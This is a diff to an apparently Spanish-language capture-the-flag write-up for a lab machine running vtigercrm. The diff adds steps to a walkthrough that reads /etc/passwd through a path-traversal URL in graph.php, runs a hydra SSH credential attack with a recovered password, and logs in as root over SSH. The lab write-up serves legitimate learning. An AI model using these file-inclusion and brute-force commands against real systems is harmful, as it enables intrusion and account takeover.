@@ -39,11 +39,17 @@ probamos a ver /etc/passwd para ver los usuarios que tienen bash e intentar cone
 
      /vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
 
-Sacamos el listado de usuarios y lanzamos hydra para ver si nos conecta por ssh con las credenciales obtenidas.
+Sacamos el listado de usuarios y dejamos solo los que tengan bash
 
 
+
+lanzamos hydra para ver si nos conecta por ssh con las credenciales obtenidas.
+
+    hydra 10.10.10.7 ssh -L user.txt -p jEhdIekWmdjE -f -vv
 
 Accemos con root por ssh
+
+    ssh -o KexAlgorithms=diffie-hellman-group1-sha1 -o Ciphers=aes256-cbc root@10.10.10.7
 
 conseguimos la flag de user.txt
 
